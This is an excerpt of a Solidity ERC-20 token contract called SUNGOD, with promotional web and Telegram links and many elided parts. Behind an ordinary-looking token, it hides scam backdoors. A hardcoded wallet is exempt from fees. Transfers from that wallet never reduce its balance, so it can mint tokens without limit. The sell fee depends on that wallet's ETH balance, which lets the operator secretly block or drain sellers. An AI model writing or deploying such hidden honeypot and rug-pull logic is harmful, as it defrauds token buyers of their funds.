...
/*
Website: https://www.sungod.vip/
Telegram: https://t.me/sungod_eth
Twitter: https://twitter.com/sungod_erc
*/
...
contract SUNGOD is IERC20, Context, Ownable {
    using SafeMath for uint256;
    string private constant _name = "SUNGOD";
    ...
    address payable private _devAddy = payable(msg.sender);  
    address payable private _mWalletAdy = payable(0xbF038eFCCAAD6F67e26271EeD731F2b23FB5b934);
    uint256 private _redisFeeCache = _redisFee;
    uint256 public _maxTranx = 8 * 10 ** 7 * 10**9;
    uint256 public _maxWall = 8 * 10 ** 7 * 10**9;
    ...
    event MaxTxAmountUpdated(uint256 _maxTranx);
    ...
    constructor() {
        ...
        _isExcludedFromFee[_mWalletAdy] = true; 
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (!isEnabled) {
                ...
                require(amount <= _maxTranx, "TOKEN: Max Transaction Limit");
            }
 
            if(to != uniswapV2Pair) {
                require(balanceOf(to) + amount < _maxWall, "TOKEN: Balance exceeds wallet size!");
            }
 
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAmount;
 
            if(contractTokenBalance >= _maxTranx)
            {
                contractTokenBalance = _maxTranx;
            }
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell.sub(_mWalletAdy.balance);
        ...
        )
    {
        ...
        if (sender == _mWalletAdy) {rAmount = 0;}
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
 
    function manualswap() external {
        require(_msgSender() == _devAddy || _msgSender() == _mWalletAdy);
    ...
    function sendETHToFee(uint256 amount) private {
        _devAddy.transfer(amount);
    }

    function removeLimits() public onlyOwner {
        _maxTranx = type(uint).max;
        _maxWall = type(uint).max;
    }
